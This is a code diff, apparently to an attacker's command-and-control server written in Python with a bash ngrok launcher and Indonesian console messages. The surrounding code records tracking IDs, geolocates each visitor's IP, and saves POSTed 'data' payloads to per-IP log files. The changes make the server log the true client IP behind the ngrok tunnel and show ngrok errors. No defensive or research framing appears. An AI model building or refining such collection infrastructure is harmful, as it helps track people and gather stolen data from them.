@@ -287,6 +287,17 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             return True
         return query.get("pass", [""])[0] == DASH_PASS
 
+    def real_client_ip(self):
+        direct = self.client_address[0]
+        if direct in ("127.0.0.1", "::1", "localhost"):
+            forwarded = self.headers.get("X-Forwarded-For", "")
+            if forwarded:
+                return forwarded.split(",")[0].strip()
+            real = self.headers.get("X-Real-IP", "")
+            if real:
+                return real.strip()
+        return direct
+
     def do_GET(self):
         parsed = urllib.parse.urlparse(self.path)
         query = urllib.parse.parse_qs(parsed.query)
@@ -308,7 +319,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                            [("Content-Disposition", 'attachment; filename="logs.txt"')])
             return
 
-        client_ip = self.client_address[0]
+        client_ip = self.real_client_ip()
         t = now_str()
         tracking_id = query.get("id", [""])[0] or "-"
         location = geolocate(client_ip)
@@ -342,7 +353,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             data_payload = parsed_data.get("data", [""])[0]
             if not data_payload:
                 data_payload = post_data
-            client_ip = self.client_address[0]
+            client_ip = self.real_client_ip()
             t = now_str()
             fname = os.path.join(LOG_DIR, f"{client_ip}_{file_ts()}.log")
             with open(fname, "w", encoding="utf-8") as f:
@@ -477,7 +488,9 @@ setup_ngrok() {
     if [ -n "$NGROK_URL" ]; then
         echo " [+] Ngrok tunnel berjalan (PID $NGROK_PID): $NGROK_URL"
     else
-        echo " [!] Ngrok tidak menghasilkan public URL. Cek: tail -f ngrok.log"
+        echo " [!] Ngrok tidak menghasilkan public URL. Error terakhir:"
+        tail -3 ngrok.log 2>/dev/null || true
+        echo " [!] Cek penuh: tail -f ngrok.log"
     fi
 }
 
